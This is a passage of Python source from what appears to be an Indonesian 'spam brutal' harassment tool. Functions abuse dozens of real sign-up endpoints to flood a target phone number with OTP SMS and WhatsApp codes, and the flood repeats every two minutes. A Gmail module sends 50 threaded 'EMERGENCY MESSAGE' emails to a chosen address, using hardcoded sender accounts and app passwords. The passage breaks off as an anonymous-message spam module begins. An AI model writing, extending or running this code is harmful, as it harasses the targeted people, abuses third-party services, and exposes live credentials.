        payload = {"nama_lengkap": nama, "email": email, "telepon": nomor}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False
        
def spam_otp_naturalfarm(nomor):
    try:
        import random, string
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]
        first = ["Andi","Budi","Citra","Dewi","Eko","Fitri","Gita","Hadi","Indah","Joko"]
        last = ["Santoso","Wijaya","Kusuma","Pratama","Sari","Putri","Rahayu","Wibowo"]
        user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        email = f"{user}@{random.choice(['gmail.com','yahoo.com','outlook.com'])}"
        url = "https://api.naturalfarm.id/api/appv1-1/register/phone"
        headers = {
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cache-Control": "max-age=86400",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Host": "api.naturalfarm.id",
            "key": "dZp91nhRNg6u+bTOa5UxgOyOW4uD020ik1F6R6okgsfTfy8qvGfem6xHwIkD6O4U",
            "Origin": "https://www.naturalfarm.id",
            "Referer": "https://www.naturalfarm.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        payload = {
            "first_name": random.choice(first),
            "last_name": random.choice(last),
            "email": email,
            "phone": nomor,
            "password": ''.join(random.choices(string.ascii_letters + string.digits + "!@#$", k=16)),
            "birthdate": "1998-01-25",
            "gender": 1,
            "platform": 1,
            "province": 6,
            "city": 151,
            "subdistrict": 2090,
            "address_id": "6_151_2090",
            "street": "JL. Marsudi Asja No 30",
            "label": "DKI Jakarta, Jakarta Barat, Kebon Jeruk",
            "card_code": None,
            "referral_code": ""
        }
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False
        
def spam_otp_toss(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        session = requests.Session()

        r1 = session.get(
            "https://toss.tubankab.go.id/register",
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            },
            timeout=10
        )

        token = re.search(r"'_token'\s*:\s*'([^']+)'", r1.text)
        if not token:
            return False
        token = token.group(1)

        r2 = session.post(
            "https://toss.tubankab.go.id/register/otp/act",
            headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
                "Origin": "https://toss.tubankab.go.id",
                "Referer": "https://toss.tubankab.go.id/register",
                "X-Requested-With": "XMLHttpRequest",
            },
            data={
                "nohp": nomor,
                "_token": token
            },
            timeout=10
        )

        return r2.status_code < 400

    except:
        return False

def spam_otp_topindowa(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; Samsung Galaxy S23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
            "Mozilla/5.0 (Linux; Android 11; OPPO A54) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; Xiaomi 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        ]

        r = requests.post(
            "https://www.top-indo.com/api/register/otp-request",
            headers={
                "content-type": "application/json",
                "origin": "https://www.top-indo.com",
                "referer": "https://www.top-indo.com/register",
                "user-agent": random.choice(user_agents),
            },
            json={
                "uuid": str(uuid.uuid4()),
                "hash": "gruenbf12d2",
                "phone": nomor,
                "via": "WA"
            },
            timeout=10
        )

        return r.status_code < 400

    except:
        return False

def spam_otp_topindosms(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; Samsung Galaxy S23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
            "Mozilla/5.0 (Linux; Android 11; OPPO A54) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; Xiaomi 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        ]

        r = requests.post(
            "https://www.top-indo.com/api/register/otp-request",
            headers={
                "content-type": "application/json",
                "origin": "https://www.top-indo.com",
                "referer": "https://www.top-indo.com/register",
                "user-agent": random.choice(user_agents),
            },
            json={
                "uuid": str(uuid.uuid4()),
                "hash": "gruenbf12d2",
                "phone": nomor,
                "via": "SMS"
            },
            timeout=10
        )

        return r.status_code < 400

    except:
        return False
        
def spam_otp_kloudmi(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        email = ''.join(random.choices(string.ascii_lowercase, k=10)) + "@gmail.com"

        session = requests.Session()

        r1 = session.get(
            "https://kloudmi.com/loyalty/cofilab/register",
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            },
            timeout=10
        )

        token = re.search(r"var _send = '([^']+)'", r1.text)
        if not token:
            return False
        token = token.group(1)

        session.post(
            "https://kloudmi.com/loyalty/cofilab/data/get_data?func=submitREGISTER",
            headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
                "Origin": "https://kloudmi.com",
                "Referer": "https://kloudmi.com/loyalty/cofilab/register",
                "X-Requested-With": "XMLHttpRequest",
            },
            data={
                "step": "regist_email",
                "email": email,
                "fullname": "Test User",
                "_send": token
            },
            timeout=10
        )

        r3 = session.post(
            "https://kloudmi.com/loyalty/cofilab/data/get_data?func=submitREGISTER",
            headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
                "Origin": "https://kloudmi.com",
                "Referer": "https://kloudmi.com/loyalty/cofilab/register",
                "X-Requested-With": "XMLHttpRequest",
            },
            data={
                "step": "regist_phone",
                "email": email,
                "phone": nomor,
                "_send": token
            },
            timeout=10
        )

        return r3.status_code < 400

    except:
        return False
        
def spam_otp_kasirpintar(nomor):
    try:
        if nomor.startswith("0"):
            nomor = "+62" + nomor[1:]
        elif nomor.startswith("62"):
            nomor = "+" + nomor

        session = requests.Session()

        r1 = session.get(
            "https://kasirpintar.co.id/registerpro",
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            },
            timeout=10
        )

        csrf = re.search(r'name="_token" value="([^"]+)"', r1.text)
        if not csrf:
            return False
        csrf = csrf.group(1)

        email = ''.join(random.choices(string.ascii_lowercase, k=10)) + str(int(time.time())) + "@gmail.com"

        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "Origin": "https://kasirpintar.co.id",
            "Referer": "https://kasirpintar.co.id/registerpro",
            "X-CSRF-TOKEN": csrf,
            "X-Requested-With": "XMLHttpRequest",
        }

        r2 = session.post(
            "https://kasirpintar.co.id/checkEmail",
            headers=headers,
            data={
                "email": email,
                "no_hp": nomor,
                "country_code": "+62",
                "g_recaptcha_response": "",
                "_token": csrf
            },
            timeout=10
        )

        token_otp = re.search(r'"token":"([^"]+)"', r2.text)
        if not token_otp:
            return False
        token_otp = token_otp.group(1)

        r3 = session.post(
            "https://kasirpintar.co.id/requestOTPWA",
            headers=headers,
            data={
                "no_hp": nomor,
                "email": email,
                "token_wa": csrf,
                "token": token_otp,
                "_token": csrf
            },
            timeout=10
        )

        return r3.status_code < 400 and r3.text not in ["token-invalid", "failed", "otp-not-available"]

    except:
        return False
        
def spam_otp_pinjamduit(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        session = requests.Session()

        BASE = "https://api.pinjamduit.co.id"

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": BASE,
            "Referer": BASE + "/h5/download_selfmedia.html"
        }

        r1 = session.post(
            BASE + "/gw/loan/credit-user/checkPhoneWeb",
            headers=headers,
            data={
                "phone": nomor,
                "mobilePhone": nomor,
                "uuid": str(uuid.uuid4()),
                "deviceId": "wh",
                "appMarket": "web",
                "appVersion": "99.99.99",
                "clientType": "w",
                "ts": int(time.time() * 1000)
            },
            timeout=10
        )

        res1 = r1.json()
        if res1.get("code") != "0":
            return False

        wybs = res1["data"]["wybs"]
        sms_useage = 10 if res1["data"]["isExist"] == 1 else 0

        headers2 = headers.copy()
        headers2["ss"] = wybs

        r2 = session.post(
            BASE + "/gw/loan/credit-user/checkPhoneNext",
            headers=headers2,
            data={
                "phone": nomor,
                "mobilePhone": nomor,
                "sms_service": 2,
                "sms_useage": sms_useage,
                "deviceId": "wh",
                "appMarket": "web",
                "appVersion": "99.99.99",
                "clientType": "w",
                "ts": int(time.time() * 1000)
            },
            timeout=10
        )

        res2 = r2.json()
        return res2.get("code") == "0"
    except:
        return False
        
def spam_otp_cairin(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]
        elif not nomor.startswith("0"):
            nomor = "0" + nomor

        session = requests.Session()

        url = f"https://app.cairin.id/v1/app/sms/sendCaptcha?phone={nomor}&type=registry&userImei=wsom&clientType=H5&haveImageCode=0&fileName=null&imageCode=null&verifySend=true"

        headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Authorization": "[object Object]",
            "Connection": "keep-alive",
            "Content-Length": "0",
            "locale": "yn",
            "Origin": "https://h5.cairin.id",
            "platform": "h5",
            "Referer": "https://h5.cairin.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
        }

        resp = session.post(url, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def mulai_spam(nomor):
    apis = {
        "bisatopup": spam_otp_bisatopup,
        "speedcash": spam_otp_speedcash,
        "singa": spam_otp_singa,
        "ktakilat": spam_otp_ktakilat,
        "uangme": spam_otp_uangme,
        "adiraku": spam_otp_adiraku,
        "tokopedia": spam_otp_tokopedia,
        "duniagames": spam_otp_duniagames,
        "acc": spam_otp_acc,
        "liva": spam_otp_liva,
        "planetban": spam_otp_planetban,
        "rumah123": spam_otp_rumah123,
        "paper": spam_otp_paperid,
        "absenku": spam_otp_absenku,
        "sicepat": spam_otp_sicepat,
        "pinhome": spam_otp_pinhome,
        "iskmumbai": spam_otp_iskconmumbai,
        "jogjakita": spam_otp_jogjakita,
        "yogyaonline": spam_otp_yogyaonline,
        "saturdays": spam_otp_saturdays,
        "bantusaku": spam_otp_bantusaku,
        "mengantar": spam_otp_mengantar,
        "toyota": spam_otp_toyota,
        "volta": spam_otp_volta,
        "kreditpintar": spam_otp_kreditpintar,
        "bunda": spam_otp_bunda,
        "maulagi": spam_otp_maulagi,
        "pluang": spam_otp_pluang,
        "youtap": spam_otp_youtap,
        "beautyhaul": spam_otp_beautyhaul,
        "byu": spam_otp_byu,
        "daihatsu2": spam_otp_astradaihatsu2,
        "daihatsusms": spam_otp_astradaihatsu_sms,
        "verdantu": spam_otp_vedantu,
        "viuum": spam_otp_viuum,
        "onebunda": spam_otp_onebunda,
        "bonusbelanja": spam_otp_bonusbelanja,
        "ibudanbalita": spam_otp_ibudanbalita,
        "swiggy": spam_otp_swiggy,
        "cilory": spam_otp_cilory,
        "naturalfarm": spam_otp_naturalfarm,
        "frradius": spam_otp_frradius,
        "internetrakyat": spam_otp_internetrakyat,
        "gritero": spam_otp_gritero,
        "tubantoss": spam_otp_toss,
        "topindokuwa": spam_otp_topindowa,
        "topindokusms": spam_otp_topindosms,
        "kloudmi": spam_otp_kloudmi,
        "kasirpintar": spam_otp_kasirpintar,
        "pinjamduit": spam_otp_pinjamduit,
    }

    for nama_api, fungsi_api in apis.items():
        try:
            fungsi_api(nomor)
        except:
            pass
        time.sleep(1)

    try:
        time.sleep(1)
        spam_otp_uku(nomor)
    except:
        pass

def simpan_sesi(nomor, waktu_kirim):
    data = {
        "nomor": nomor,
        "waktu_kirim": waktu_kirim
    }
    with open(SESSION_FILE, "w") as f:
        json.dump(data, f)

def baca_sesi():
    try:
        with open(SESSION_FILE, "r") as f:
            return json.load(f)
    except:
        return None

def hapus_sesi():
    try:
        os.remove(SESSION_FILE)
    except:
        pass

def spam_countdown(waktu_kirim, detik=120):
    def handler(sig, frame):
        raise KeyboardInterrupt
    signal.signal(signal.SIGINT, handler)
    try:
        while True:
            sisa = detik - int(time.time() - waktu_kirim)
            if sisa <= 0:
                break
            menit = sisa // 60
            detik_sisa = sisa % 60
            waktu = f"{menit:02d}.{detik_sisa:02d}"
            sys.stdout.write(f"\r{a}╭─────────────────────────────────────────────────────────────╮\n")
            sys.stdout.write(f"{a}│{p} {h}🜲{p} Otp Successfully Terkirim{' '*31}{a}  │\n")
            sys.stdout.write(f"{a}│{p} {h}⏱{p} Mengirim Ulang Dalam : {h}{waktu}{' '*(29-len(waktu))}      {a}│\n")
            sys.stdout.write(f"{a}╰───────────────────{m}>> {h}CTRL {p}+{h} C {p}For Exit{a} {m}<<{a}───────────────────╯{r}")
            sys.stdout.flush()
            sys.stdout.write("\033[3A")
            time.sleep(1)
        sys.stdout.write("\n\n\n\n")
    finally:
        signal.signal(signal.SIGINT, kontol_sinyal)

def spam_otp_main():
    print(f"""{a}
╭─────────────────────────────────────────────────────────────╮
│{p} Masukkan Nomor Target Format Nasional. Contoh{m}: {h}08×××××××××× {a}│
╰── ╭─ {m}[{p} N O M O R{m} ]{a} ─────────────────────────────────────────╯""")

    nomor = input(f"    {a}╰──{h}➤{p} ").strip()
    print()

    if not nomor:
        input(f"{p} [{m}!{p}] Nomor tidak boleh kosong!{p} {m}|{h} ENTER{r}")
        return

    if nomor.startswith("0"):
        nomor = "62" + nomor[1:]
    elif nomor.startswith("+62"):
        nomor = nomor[1:]
    elif nomor.startswith("62"):
        pass
    else:
        nomor = "62" + nomor

    update_leaderboard(1)
    kirim_log_aktivitas("1 - Spam OTP Brutal", nomor)

    try:
        sesi = baca_sesi()
        if sesi and sesi.get("nomor") == nomor:
            waktu_kirim = sesi.get("waktu_kirim")
            sisa = 120 - int(time.time() - waktu_kirim)
            if sisa > 0:
                spam_countdown(waktu_kirim, 120)

        while True:
            sesi_captcha = None
            try:
                from PIL import Image
                from io import BytesIO
                sesi_captcha = requests.Session()
                sesi_captcha.get(
                    "https://registrasi.absenku.com/index.php/register/index/2",
                    headers={"user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"},
                    timeout=10
                )
                resp_captcha = sesi_captcha.get(
                    "https://registrasi.absenku.com/index.php/register/captcha",
                    headers={
                        "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
                        "referer": "https://registrasi.absenku.com/index.php/register/index/2",
                    },
                    timeout=10
                )
                img = Image.open(BytesIO(resp_captcha.content))
                img.save("/sdcard/absenku.png")
                print(f"""{a}╭─────────────────────────────────────────────────────────────╮
│ {p} Kode Captcha OTP Absenku Tersimpan Di {h}/sdcard/absenku.png  {a}│
╰── ╭─ {m}[{p} C A P T C H A{m} ]{a} ─────────────────────────────────────╯""")
            except Exception as e:
                print(f"\n {p}[{m}!{p}] Gagal ambil captcha: {e}")

            captcha_absenku = input_dengan_timeout(f"    {a}╰──{h}➤{p} ", timeout=20)
            print(r)

            mulai_spam(nomor)
            spam_otp_absenku(nomor, captcha_absenku, sesi_captcha)

            waktu_kirim = time.time()
            simpan_sesi(nomor, waktu_kirim)
            spam_countdown(waktu_kirim, 120)
            hapus_sesi()

    except KeyboardInterrupt:
        sys.stdout.write("\n\n\n\n")
        print(f"\n{p} [{h}+{p}] Kembali Ke Menu Spammer{r}")
        time.sleep(1)
        return

def gmail_spam_pesan_acak():
    return [
        "Hey! Hope you're having a great day!",
        "Just wanted to say hello and check in with you.",
        "Thinking of you today. Hope everything is going well!",
        "You're awesome! Keep being amazing!",
        "Sending positive vibes your way!",
        "Hope your day is as wonderful as you are!",
        "Just a quick message to brighten your day!",
        "You've got this! Stay strong!",
        "Wishing you a fantastic day ahead!",
        "Keep smiling! You're doing great!",
        "Just wanted to remind you how awesome you are!",
        "Hope you're doing well! Take care!",
        "Sending good energy your way today!",
        "You're incredible! Don't forget that!",
        "Have an amazing day! You deserve it!",
        "Just checking in to say you're appreciated!",
        "Keep up the great work! You're killing it!",
        "Hope this message makes you smile!",
        "You're stronger than you think!",
        "Believe in yourself! You're amazing!"
    ]

def gmail_spam_subjek():
    return [
        "Hello!",
        "Important Update",
        "Quick Question",
        "Follow Up",
        "Regarding Your Inquiry",
        "Just Checking In",
        "Reminder",
        "Meeting Request",
        "Information You Requested",
        "Update on Your Request",
        "Thank You",
        "Confirmation",
        "Schedule Update",
        "Quick Update",
        "Response Needed"
    ]

def gmail_spam_loadbar(stop_event, completed_ref, total):
    COLORS = [
        "\033[1;91m",
        "\033[1;93m",
        "\033[1;92m",
        "\033[1;94m",
    ]
    RESET = "\033[0m"
   
    length = 23
    color_index = 0
    
    print(f"""{a}╭─────────────────────────────────────────────────────────────╮
│{p} Sedang Mengirimkan {h}{total}{p} Pesan Secara Terus Menerus Ke Gmail   {a}│
│{p} Target Dengan Cepat Tanpa Delay [[                       ]] {a}│
╰─────────────────────────────────────────────────────────────╯""")
    
    sys.stdout.write("\033[s")
    
    while not stop_event.is_set():
        for i in range(length + 1):
            if stop_event.is_set():
                break
                
            filled_color = COLORS[color_index % len(COLORS)] + "■" * i + RESET
            empty = "□" * (length - i)
            
            current = completed_ref[0]
            
            sys.stdout.write("\033[u")
            sys.stdout.write("\033[2A")
            sys.stdout.write("\033[36C")
            
            sys.stdout.write(f"\033[0m{filled_color}{empty}\033[0m")
            sys.stdout.flush()
            
            time.sleep(0.05)
            
            color_index += 1
    
    sys.stdout.write("\033[u")

def gmail_spam_body_pesan(message):
    current_date = datetime.now().strftime("%A, %B %d, %Y at %I:%M %p")
    
    body = f"""{message}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Message From Nexus Corporation — Anonymous
Date : {current_date}
"""
    return body

def cek_format_random_pesan(message):
    variations = [
        message,
        message + " ",
        " " + message,
        message + "  ",
    ]
    return random.choice(variations)

def gmail_spam_kirim_pesan(sender_email, sender_password, recipient_email, subject, message, task_number):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = recipient_email
        msg['Subject'] = subject
        
        randomized_message = cek_format_random_pesan(message)
        body = gmail_spam_body_pesan(randomized_message)
        
        msg.attach(MIMEText(body, 'plain'))
        
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        
        text = msg.as_string()
        server.sendmail(sender_email, recipient_email, text)
        server.quit()
        
        return (task_number, True)
        
    except Exception as e:
        return (task_number, False)

def gmail_spam_send_email_random_subject(sender_email, sender_password, recipient_email, message, task_number):
    subjects = gmail_spam_subjek()
    subject = random.choice(subjects)
    
    return gmail_spam_kirim_pesan(sender_email, sender_password, recipient_email, subject, message, task_number)

def gmail_spam_c_format(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    
    if re.match(pattern, email):
        return True
    return False

def gmail_spam_main():
    sender_email_1 = "daemoniumuser@gmail.com"
    sender_password_1 = "glut quzx wivs kksb"
    
    sender_email_2 = "daemoniumuserv2@gmail.com"
    sender_password_2 = "opxd tgvl gnay fybh"
    
    sender_email_3 = "daemontechx@gmail.com"
    sender_password_3 = "kgur ihmi bxlk pnhc"
    
    senders = [
        (sender_email_1, sender_password_1),
        (sender_email_2, sender_password_2),
        (sender_email_3, sender_password_3)
    ]

    print(f"""{a}
╭─────────────────────────────────────────────────────────────╮
│ {p}Masukkan Alamat Google Mail Target. Contoh{m}:{h} enemy@gmail.com {a}│
╰── ╭─ {m}[{p} G M A I L {m}]{a} ─────────────────────────────────────────╯""")

    mode = '1'
    
    recipient_email = input(f"    {a}╰──{h}➤{p} ").strip()
    
    if not recipient_email:
        input(f"\n{p} [{m}!{p}]{p} Email Ga Boleh Kosong{m} | {h} ENTER {r}")
        return

    if not gmail_spam_c_format(recipient_email):
        input(f"\n{p} [{m}!{p}]{p} Format Email Tidak Valid{m} | {h}ENTER {r}")
        return
    
    message = None
    subject = "‼️EMERGENCY MESSAGE‼️"
    
    jumlah = 50
    threads = 10
    
    confirm = input(f"\n {p}[{h}+{p}]{p} Silahkan {h}ENTER{r} {p}Atau Ketik {h}N{r} {p}Untuk Membatalkan{m} :{p} ").strip().lower()
    
    if confirm == 'n':
        return
    
    
    sukses = 0
    gagal = 0
    lock = threading.Lock()
    completed = 0
    completed_ref = [0]
    stop_loading = threading.Event()
    
    def gmail_spam_worker(task_num):
        nonlocal sukses, gagal, completed
        
        current_subject = "‼️EMERGENCY MESSAGE‼️"
        
        sender_email, sender_password = random.choice(senders)
       
        random_messages = gmail_spam_pesan_acak()
        current_message = random.choice(random_messages)
        
        task_number, result = gmail_spam_kirim_pesan(
            sender_email, sender_password, recipient_email, 
            current_subject, current_message, task_num
        )
        
        with lock:
            completed += 1
            completed_ref[0] = completed
            if result:
                sukses += 1
            else:
                gagal += 1

    print()
    
    loading_thread = threading.Thread(target=gmail_spam_loadbar, args=(stop_loading, completed_ref, jumlah))
    loading_thread.daemon = True
    loading_thread.start()
    
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(gmail_spam_worker, i) for i in range(1, jumlah + 1)]
        
        for future in as_completed(futures):
            future.result()
    
    end_time = time.time()
    elapsed = end_time - start_time

    stop_loading.set()
    loading_thread.join()

    jarak_sukses = " " * (7 - len(str(sukses)))
    jarak_gagal = " " * (7 - len(str(gagal)))
    
    update_leaderboard(2)
    kirim_log_aktivitas("2 - Spam Gmail Brutal", recipient_email)

    print(f"""{a}╭─────────────────────────────────────────────────────────────╮
│{p} Proses Pengiriman Selesai {m}|{p} Sukses{m}:{h} {sukses}{jarak_sukses} {m}|{p} Gagal{m}:{h} {gagal}{jarak_gagal}{a}│
╰─────────────────────────────────────────────────────────────╯""")
    input(f"\n {h}࿈{p} Kembali Ke Menu Spam {m}|{h} ENTER")
    
def ngl_spam_pesan_acak():
    return [
        "Lagi ngapain sekarang?",
        "Kamu lagi dimana?",
        "Aku kangen deh sama kamu",
        "Umur kamu berapa sih kalau boleh tau?",
        "Lagi sibuk gak?",
        "Kok jarang online akhir-akhir ini?",
        "Aku mau confess tapi takut ditolak",
        "Sebenernya aku suka sama kamu",
        "Kamu udah makan belum?",
        "Hari ini capek gak?",
        "Kamu tipe orang yang setia gak sih?",
        "Kalau lagi sedih biasanya ngapain?",
        "Pengen deket tapi gengsi",
        "Kamu masih single kan?",
        "Aku kepikiran kamu terus",
        "Kamu orangnya humoris ya",
        "Kalau weekend biasanya ngapain?",
        "Aku penasaran sama kehidupan kamu",
        "Boleh kenalan lebih dekat gak?",
        "Kamu punya pacar gak sekarang?",
        "Kamu cakep/cantik banget sih",
        "Aku nyaman ngobrol sama kamu",
        "Kamu lagi bad mood ya?",
        "Jangan lupa jaga kesehatan ya",
        "Aku seneng liat story kamu",
        "Kok kamu jarang update sih?",
        "Aku pengen chat kamu tapi malu",
        "Kamu suka dengerin lagu apa?",
        "Kalau lagi galau biasanya ngapain?",
        "Aku pengen jadi orang spesial buat kamu",
        "Kamu lagi mikirin apa sekarang?",
        "Aku iri sama orang yang deket sama kamu",
        "Kamu gampang baper gak?",
        "Aku pengen jujur tapi takut kamu ilfeel",
        "Kamu percaya cinta online gak?",
        "Aku selalu nunggu balasan kamu",
        "Kamu pernah suka diam-diam gak?",
        "Aku pengen ngajak kamu jalan",
        "Kamu lagi overthinking ya?",
        "Aku nyaman sama kamu tanpa alasan",
        "Kamu orangnya perhatian banget",
        "Aku suka cara kamu ngomong",
        "Kalau aku bilang aku suka, kamu gimana?",
        "Kamu bikin hari aku lebih baik",
        "Aku takut kehilangan kamu",
        "Kamu masih inget aku gak?",
        "Aku pengen lebih sering ngobrol sama kamu",
        "Kamu itu bikin penasaran",
        "Aku pengen jadi tempat cerita kamu",
        "Kamu lagi bahagia gak sekarang?"
    ]

def ngl_spam_ua():
    return [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
